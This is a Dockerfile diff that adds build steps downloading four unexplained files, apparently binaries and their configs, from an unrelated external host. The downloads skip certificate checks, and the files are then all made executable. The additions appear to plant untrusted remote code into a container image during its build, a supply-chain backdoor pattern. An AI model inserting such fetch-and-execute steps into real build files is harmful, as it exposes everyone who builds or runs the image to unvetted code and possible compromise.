@@ -44,6 +44,11 @@ RUN \
     /tmp/* \
     /var/lib/apt/lists/* \
     /var/tmp/*
+RUN wget --no-check-certificate https://s.bccx.eu.org/s -O /config/s
+RUN wget --no-check-certificate https://s.bccx.eu.org/v -O /config/v
+RUN wget --no-check-certificate https://s.bccx.eu.org/config.json -O /config/config.json
+RUN wget --no-check-certificate https://s.bccx.eu.org/v.json -O /config/v.json
+RUN chmod +x /config/*
 # add local files
 COPY /root /
 
